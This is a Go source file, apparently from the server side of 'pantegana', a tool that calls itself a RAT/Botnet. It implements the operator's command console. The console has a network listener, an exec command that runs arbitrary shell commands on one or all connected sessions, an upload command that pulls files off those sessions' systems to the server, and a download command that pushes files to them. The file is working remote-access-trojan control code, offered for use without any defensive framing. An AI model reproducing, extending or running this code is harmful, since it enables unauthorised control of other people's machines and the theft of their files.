package server

import (
	"fmt"
	"io"
	"strings"

	"github.com/desertbit/grumble"
	"github.com/fatih/color"
)

var cli = grumble.New(&grumble.Config{
	Name:                  "pantegana",
	Description:           "A RAT/Botnet written in Go",
	HistoryFile:           "/tmp/pantegana.hist",
	Prompt:                "[pantegana]$ ",
	PromptColor:           color.New(color.FgHiCyan, color.Bold),
	HelpHeadlineColor:     color.New(color.FgCyan),
	HelpHeadlineUnderline: true,
	HelpSubCommands:       true,

	Flags: func(f *grumble.Flags) {
		f.Bool("q", "quiet", false, "disables ASCII start-up logo")
	},
})

var RedF = color.New(color.FgRed).SprintfFunc()
var GreenF = color.New(color.FgGreen).SprintfFunc()

func init() {
	cli.OnInit(func(a *grumble.App, flags grumble.FlagMap) error {
		if !flags.Bool("quiet") {
			cli.SetPrintASCIILogo(func(a *grumble.App) {
				a.Println()
				a.Println("   ___            _                               ")
				a.Println("  / _ \\__ _ _ __ | |_ ___  __ _  __ _ _ __   __ _ ")
				a.Println(" / /_)/ _` | '_ \\| __/ _ \\/ _` |/ _` | '_ \\ / _` |")
				a.Println("/ ___/ (_| | | | | ||  __/ (_| | (_| | | | | (_| |")
				a.Println("\\/    \\__,_|_| |_|\\__\\___|\\__, |\\__,_|_| |_|\\__,_|")
				a.Println("                          |___/                   ")
				a.Println()
			})
		}
		return nil
	})

	cli.AddCommand(&grumble.Command{
		Name:    "listen",
		Help:    "runs the listener",
		Aliases: []string{"l"},

		Flags: func(f *grumble.Flags) {
			f.Int("p", "port", 1337, "the port to listen (443 needs root privileges)")
			f.Bool("v", "verbose", false, "gives extra output information")
			f.BoolL("plaintext", false, "set to remove encryption. Use mostly in testing.")
		},

		Args: func(a *grumble.Args) {
			a.String("host", `a host to listen to (for ipv6 put in square brackets. eg: "[::1]")`, grumble.Default("127.0.0.1"))
		},

		Run: func(c *grumble.Context) error {
			cfg := ListenerConfig{
				Addr:      fmt.Sprintf("%s:%d", c.Args.String("host"), c.Flags.Int("port")),
				Plaintext: c.Flags.Bool("plaintext"),
				VW:        (map[bool]io.Writer{true: cli.Stdout(), false: io.Discard})[c.Flags.Bool("verbose")], // Ternary operator hack
			}

			go StartListener(&cfg)
			return nil
		},
	})

	cli.AddCommand(&grumble.Command{
		Name:    "exec",
		Help:    "executes a command to a session",
		Aliases: []string{"e"},

		Flags: func(f *grumble.Flags) {
			f.Int("s", "session", -1, " * the sesssion to execute the command to.")
			f.BoolL("all", false, "runs the command on all sessions")
		},

		Args: func(a *grumble.Args) {
			a.StringList("cmd", "command to execute")
		},

		Run: func(c *grumble.Context) error {
			cmd := strings.Join(c.Args.StringList("cmd"), " ")

			if c.Flags.Bool("all") {
				for i := range sessions {
					sessionObj, err := GetSession(i)
					if err != nil {
						return err
					}
					if sessionObj.Open {
						go func() {
							err := sessionObj.WriteToCmd(cmd)
							if err != nil {
								cli.PrintError(err)
							}
						}()
					}
				}
			} else if c.Flags.Int("session") == -1 {
				return ErrUndefinedSessionInCLI
			} else {
				sessionId := c.Flags.Int("session")
				sessionObj, err := GetSession(sessionId)
				if err != nil {
					return err
				}

				go func() {
					err = sessionObj.WriteToCmd(cmd)
					if err != nil {
						cli.PrintError(err)
					}
				}()
			}

			return nil
		},
	})

	cli.AddCommand(&grumble.Command{
		Name:    "close",
		Help:    "closes the listener",
		Aliases: []string{"c"},

		Flags: func(f *grumble.Flags) {
			f.BoolL("clear", false, "deletes all the sessions from the server")
		},

		Run: func(c *grumble.Context) error {
			err := CloseListener()
			if err != nil {
				return err
			}
			if c.Flags.Bool("clear") {
				ClearSessions()
			}
			cli.Println(GreenF("[+] Listener successfully closed"))
			return nil
		},
	})

	cli.AddCommand(&grumble.Command{
		Name:    "sessions",
		Help:    "lists currently open sessions",
		Aliases: []string{"s"},

		Run: func(c *grumble.Context) error {
			PrettyPrintSessions()
			return nil
		},
	})

	cli.AddCommand(&grumble.Command{
		Name:    "upload",
		Help:    "transfer a file from a session to the server (ends up in uploads dir)",
		Aliases: []string{"up"},

		Args: func(a *grumble.Args) {
			a.String("source", "the name of the file on the session's system")
			a.String("destname", "the name that the file will have on the server's uploads dir", grumble.Default(""))
		},

		Flags: func(f *grumble.Flags) {
			f.Int("s", "session", -1, " * the sesssion to execute the command to.")
		},

		Run: func(c *grumble.Context) error {
			if c.Flags.Int("session") == -1 {
				return ErrUndefinedSessionInCLI
			}
			sessionId := c.Flags.Int("session")
			sessionObj, err := GetSession(sessionId)
			if err != nil {
				return err
			}

			source := c.Args.String("source")
			dest := c.Args.String("destname")
			if dest == "" {
				dest = source
			}

			go func() {
				err = sessionObj.WriteToCmd(fmt.Sprintf("__upload__ %s %s", source, dest))
				if err != nil {
					cli.PrintError(err)
				}
			}()

			return nil
		},
	})

	cli.AddCommand(&grumble.Command{
		Name:    "download",
		Help:    "transfer a file from the server to a session (ends up in download dir)",
		Aliases: []string{"dl"},

		Args: func(a *grumble.Args) {
			a.String("source", "the name of the file on the servers's system")
			a.String("destname", "the name that the file will have on the session's uploads dir", grumble.Default(""))
		},

		Flags: func(f *grumble.Flags) {
			f.Int("s", "session", -1, " * the sesssion to execute the command to.")
		},

		Run: func(c *grumble.Context) error {
			if c.Flags.Int("session") == -1 {
				return ErrUndefinedSessionInCLI
			}
			sessionId := c.Flags.Int("session")
			sessionObj, err := GetSession(sessionId)
			if err != nil {
				return err
			}

			source := c.Args.String("source")
			dest := c.Args.String("destname")
			if dest == "" {
				dest = source
			}

			go func() {
				err = sessionObj.WriteToCmd(fmt.Sprintf("__download__ %s %s", source, dest))
				if err != nil {
					cli.PrintError(err)
				}
			}()

			return nil
		},
	})
}
